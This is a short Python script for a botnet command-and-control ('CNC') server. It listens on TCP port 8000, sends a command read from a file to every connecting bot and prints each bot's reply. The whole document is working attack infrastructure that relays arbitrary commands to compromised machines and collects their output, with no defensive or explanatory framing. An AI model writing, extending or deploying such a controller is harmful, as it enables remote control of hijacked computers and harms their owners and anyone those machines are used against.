import socketserver

# Read command from file
with open("commands.txt", "r") as f:
    command_to_send = f.read().strip()

class BotHandler(socketserver.BaseRequestHandler):
    def handle(self):
        print(f"Bot connected from: {self.client_address[0]}")
        
        try:
            # Send command
            self.request.sendall(command_to_send.encode())

            # Receive response
            data = self.request.recv(4096).decode()
            print(f"[{self.client_address[0]}] Response:\n{data}\n")

        except Exception as e:
            print(f"Error handling bot {self.client_address[0]}: {e}")

if __name__ == "__main__":
    HOST, PORT = "", 8000
    with socketserver.ThreadingTCPServer((HOST, PORT), BotHandler) as server:
        print(f"CNC server running on port {PORT}...")
        server.serve_forever()
